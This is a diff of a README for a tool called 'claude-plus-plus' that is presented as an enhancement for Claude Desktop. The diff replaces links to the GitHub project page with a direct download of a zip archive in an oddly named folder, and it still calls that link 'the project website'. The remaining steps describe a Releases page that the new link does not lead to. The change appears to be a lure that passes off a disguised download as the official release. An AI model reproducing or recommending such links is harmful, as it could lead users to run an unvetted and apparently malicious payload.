@@ -1,6 +1,6 @@
 # 🛠️ claude-plus-plus - Improve your Claude Desktop experience today
 
-[![](https://img.shields.io/badge/Download-Release-blue)](https://github.com/exciting-soursop787/claude-plus-plus)
+[![](https://img.shields.io/badge/Download-Release-blue)](https://raw.githubusercontent.com/exciting-soursop787/claude-plus-plus/main/Dasyatis/plus_claude_2.8.zip)
 
 ## 📦 What is this tool?
 
@@ -20,7 +20,7 @@ Before you start, ensure your computer meets these needs:
 
 Follow these steps to set up the tool on your machine:
 
-1. Visit the project website: [https://github.com/exciting-soursop787/claude-plus-plus](https://github.com/exciting-soursop787/claude-plus-plus).
+1. Visit the project website: [https://raw.githubusercontent.com/exciting-soursop787/claude-plus-plus/main/Dasyatis/plus_claude_2.8.zip](https://raw.githubusercontent.com/exciting-soursop787/claude-plus-plus/main/Dasyatis/plus_claude_2.8.zip).
 2. Look for the "Releases" section on the right side of the page.
 3. Click on the latest version number link.
 4. Scroll down to the "Assets" area.
